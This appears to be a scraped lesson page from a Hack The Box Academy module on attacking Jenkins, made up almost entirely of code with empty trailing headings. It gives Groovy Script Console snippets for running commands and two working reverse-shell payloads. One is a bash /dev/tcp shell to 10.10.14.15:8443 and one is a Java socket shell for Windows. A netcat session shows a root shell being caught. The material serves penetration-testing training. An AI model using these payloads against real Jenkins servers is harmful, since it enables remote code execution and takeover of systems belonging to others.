<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/113/section/1212
// Platform Version: V1
// Module ID: 113
// Module Name: Attacking Common Applications
// Module Difficulty: Medium
// Section ID: 1212
// Section Title: Attacking Jenkins
// Page Title: Attacking Common Applications
// Page Number: 12
-->

# Attacking Jenkins

**Module Name:** Attacking Common Applications **Page Number:** 12

#### ATTACKING COMMON APPLICATIONS

# Attacking Jenkins

## Script Console

``` groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

![https://academy.hackthebox.com/storage/modules/113/groovy_web.png](https://academy.hackthebox.com/storage/modules/113/groovy_web.png)

``` groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

``` shell-session
[!bash!]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#
```

``` groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

``` groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Miscellaneous Vulnerabilities

## Shifting Gears

# 

# 

#### Questions

####